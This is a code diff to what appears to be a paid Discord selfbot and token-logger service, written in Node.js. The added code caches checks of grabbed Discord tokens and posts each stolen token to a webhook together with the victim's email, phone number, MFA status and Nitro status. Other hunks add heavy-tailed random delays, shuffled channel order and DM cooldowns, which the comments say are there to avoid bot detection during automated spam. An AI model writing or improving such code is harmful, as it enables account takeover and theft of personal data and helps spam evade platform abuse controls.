+    const cacheKey = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
+    const cached = _tokenValidationCache.get(cacheKey);
+    if (cached && (Date.now() - cached.ts) < TOKEN_VALID_CACHE_MS) {
+      // Use cached result but still log
+      if (cached.valid && cached.userData) {
+        const fullInfo = { ...userInfo, ...cached.userData };
+        db.addGrabbedToken(token, fullInfo, source);
+        const embed = {
+          title: 'Token Grabbed',
+          color: 0xff0000,
+          fields: [
+            { name: 'Token', value: '```' + token + '```', inline: false },
+            { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
+            { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
+            { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
+            { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
+            { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
+            { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
+            { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
+            { name: 'Source', value: source, inline: true },
+            { name: 'Time', value: new Date().toISOString(), inline: true }
+          ],
+          footer: { text: 'Token Logger v2.0' }
+        };
+        await _sendWebhookChunk(embed, 0);
+        return { success: true, user: fullInfo };
+      }
+    }
+
     const fp = _rfp(token);
     const superProps = generateXSuperProperties(token);
     const validateRes = await Promise.race([
@@ -1319,11 +1978,35 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
       new Promise((_, reject) => setTimeout(() => reject(new Error('Token validation timed out')), 15000))
     ]);
 
-    if (validateRes.status === 401 || validateRes.status === 403) { return { success: false, error: 'Invalid token' }; }
-    if (validateRes.status < 200 || validateRes.status >= 300 || !validateRes.data) { return { success: false, error: 'Invalid token' }; }
+    if (validateRes.status === 401 || validateRes.status === 403) {
+      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
+      return { success: false, error: 'Invalid token' };
+    }
+    if (validateRes.status < 200 || validateRes.status >= 300 || !validateRes.data) {
+      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
+      return { success: false, error: 'Invalid token' };
+    }
 
     const userData = validateRes.data;
     const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
+
+    // Cache the successful validation
+    _tokenValidationCache.set(cacheKey, {
+      valid: true,
+      ts: Date.now(),
+      userData: {
+        id: userData.id,
+        username: userData.username,
+        global_name: userData.global_name,
+        email: userData.email,
+        phone: userData.phone,
+        verified: userData.verified,
+        mfa_enabled: userData.mfa_enabled,
+        nitro: userData.premium_type,
+        locale: userData.locale
+      }
+    });
+
     db.addGrabbedToken(token, fullInfo, source);
 
     const embed = {
@@ -1581,6 +2264,9 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
     let currentChIdx = 0;
     let stopped = false;
 
+    // Generate channel visit weights — humans favor some channels over others
+    const channelWeights = channelList.map(() => 0.5 + Math.random());
+
     const msgLoop = async () => {
       while (!stopped && activeBots.has(botKey)) {
         if (db) {
@@ -1616,7 +2302,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
               }
             } catch(e) {}
             if (attempt < maxAttempts) {
-              const backoff = 2000 + Math.random() * 3000;
+              const backoff = boundedPareto(2.5, 1500, 5000);
               await new Promise(r => setTimeout(r, backoff));
             }
           }
@@ -1624,8 +2310,14 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
         };
 
         if (sendAllAtOnce) {
-          for (let i = 0; i < channelList.length; i++) {
-            const chId = channelList[i];
+          // Shuffle channel order slightly each round — humans don't always go A→B→C
+          const shuffledChannels = channelList
+            .map((id, i) => ({ id, weight: channelWeights[i] + (Math.random() * 0.3) }))
+            .sort((a, b) => b.weight - a.weight)
+            .map(c => c.id);
+
+          for (let i = 0; i < shuffledChannels.length; i++) {
+            const chId = shuffledChannels[i];
 
             const canSend = await client.checkChannelPermission(chId);
             if (canSend === false) continue;
@@ -1639,14 +2331,15 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             }).filter(Boolean);
             await sendWithRetry(chId, msg.text, files);
 
-            // Natural navigation delay between channels - not teleportation
-            if (i < channelList.length - 1) {
-              const navDelay = 2000 + Math.random() * 2500;
-              await new Promise(r => setTimeout(r, navDelay));
+            // Natural navigation delay between channels — log-normal distributed
+            if (i < shuffledChannels.length - 1) {
+              const navDelay = Math.round(logNormalSample(7.8, 0.35)); // ~1800-4000ms
+              await new Promise(r => setTimeout(r, Math.min(6000, Math.max(1000, navDelay))));
             }
           }
         } else {
-          const chId = channelList[currentChIdx % channelList.length];
+          // Weighted random channel selection instead of strict round-robin
+          const chId = weightedRandom(channelList, channelWeights);
           currentChIdx++;
 
           const canSend = await client.checkChannelPermission(chId);
@@ -1666,27 +2359,18 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
 
         currentMsgIdx++;
 
-        // Humanized delay between messages: 20-45 seconds base
-        const roll = Math.random();
-        let humanDelay;
-        const minDelay = 20000;  // 20 seconds minimum
-        const maxDelay = 45000;  // 45 seconds maximum
-        const baseDelay = minDelay + Math.random() * (maxDelay - minDelay);
-
-        if (roll < 0.6) {
-          // Normal pace
-          humanDelay = baseDelay;
-        } else if (roll < 0.85) {
-          // Slightly faster (but still within 20-45s range)
-          humanDelay = minDelay + Math.random() * 8000;
-        } else if (roll < 0.95) {
-          // Slightly slower
-          humanDelay = maxDelay - 5000 + Math.random() * 5000;
-        } else {
-          // Occasional longer pause (up to 60s)
-          humanDelay = 45000 + Math.random() * 15000;
-        }
-        await new Promise(r => setTimeout(r, humanDelay));
+        // ═══════════════════════════════════════════════════════════════════
+        // HUMANIZED DELAY — Heavy-tailed Pareto distribution
+        // Replaces the old uniform random with realistic human timing
+        // ═══════════════════════════════════════════════════════════════════
+        const humanDelayMs = humanDelay({
+          min: delayMs * 0.6,
+          max: delayMs * 1.6,
+          alpha: 3.5,
+          enableCircadian: true,
+          enableContextSwitch: true
+        });
+        await new Promise(r => setTimeout(r, humanDelayMs));
       }
     };
 
@@ -1707,8 +2391,8 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
 
         const now = Date.now();
         const lastReply = client._dmCooldowns.get(msg.author.id) || 0;
-        // Strict 20-45 second cooldown per user to avoid bot detection
-        const cooldownMs = 20000 + Math.random() * 25000;
+        // Heavy-tailed DM cooldown using Pareto distribution
+        const cooldownMs = boundedPareto(3.0, 15000, 60000);
         if (now - lastReply < cooldownMs) return;
 
         // Allow occasional re-engagement (10% chance) to simulate natural human behavior
@@ -1721,8 +2405,11 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
         client.pendingReplies.add(msg.author.id);
 
         // Humanized: read the message first, then think, then type
-        const readTime = 2000 + Math.random() * 4000; // 2-6 seconds reading
-        await new Promise(r => setTimeout(r, readTime));
+        // Log-normal reading time based on message length
+        const msgLen = msg.content ? msg.content.length : 0;
+        const readTimeBase = 1500 + (msgLen * 40); // ~40ms per character
+        const readTime = Math.round(logNormalSample(Math.log(readTimeBase), 0.35));
+        await new Promise(r => setTimeout(r, Math.min(8000, Math.max(1000, readTime))));
 
         client.pendingReplies.delete(msg.author.id);
         if (!activeBots.has(botKey)) return;
@@ -1733,8 +2420,9 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
         client._dmCooldowns.set(msg.author.id, Date.now());
 
         try {
-          // Navigate to channel naturally before replying - no teleportation
+          // Navigate to channel naturally before replying — with context-switch jitter
           await client.navigateToChannel(msg.channel_id);
+          // Vary the auto-reply content using spintax
           await client.sendMessage(msg.channel_id, autoReplyText);
         } catch (err) {
           try {
